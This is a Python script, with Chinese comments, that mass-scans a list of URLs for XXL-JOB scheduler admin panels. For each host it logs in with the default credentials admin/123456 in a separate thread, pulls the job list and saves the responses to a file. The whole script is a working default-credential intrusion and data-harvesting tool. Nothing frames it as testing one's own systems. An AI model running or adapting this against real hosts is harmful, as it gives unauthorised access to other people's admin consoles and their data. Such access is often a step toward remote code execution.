import requests
import json
import threading
from urllib.parse import urlparse

headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
}

login_data = {'userName': 'admin', 'password': '123456'}

# 发送查询请求
jobinfo_data = {
    'jobGroup': '2',
    'triggerStatus': '-1',
    'jobDesc': '',
    'executorHandler': '',
    'author': '',
    'start': '0',
    'length': '10'
}

counts = 0

names = {}

def run(n, url):
    global counts
    try:
        # 发送登录请求，获取Cookie
        response = requests.post(f'{url}/xxl-job-admin/login', headers=headers, data=login_data, timeout=5)
        response.raise_for_status()  # 抛出HTTP错误
        if 'code":200' in response.text:
            cookie = response.cookies.get_dict()
            headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in cookie.items()])
    except:
        print(f'请求错误：{n} --> {url}')
        return

    try:
        response = requests.post(f'{url}/xxl-job-admin/jobinfo/pageList', headers=headers, data=jobinfo_data,
                                 timeout=5)
        response.raise_for_status()  # 抛出HTTP错误
    except:
        print(f'请求错误：{n} --> {url}')
        return

    try:
        txt = response.text
        if "<!DOCTYPE html>" in txt:
            assert 0
        j = json.loads(txt)
    except:
        print(f'请求错误：{n} --> {url}，登入页！')
        return

    # 获取主机名部分
    parsed_url = urlparse(url)
    host = response.request.headers.get('Host', parsed_url.hostname)

    # 将结果写入文件
    with open('1.txt', 'a') as f:
        f.write(f'{url}\n')
        f.write(f'{host}\n')
        f.write(f'{response.text}\n')

    counts += 1


if __name__ == '__main__':
    with open('URL.txt', 'r') as url_file:
        urls = url_file.read().splitlines()
    print(f'总共{len(urls)}个')
    th = []

    for n, url in enumerate(urls):
        names[f'thr{n}'] = threading.Thread(name=f"{n}", target=run, args=(n, url))
        names[f'thr{n}'].start()
        th.append(names[f'thr{n}'])

    for t in th:
        t.join()

    print("总共:{}。完毕！！！！！！！！！！！".format(counts))
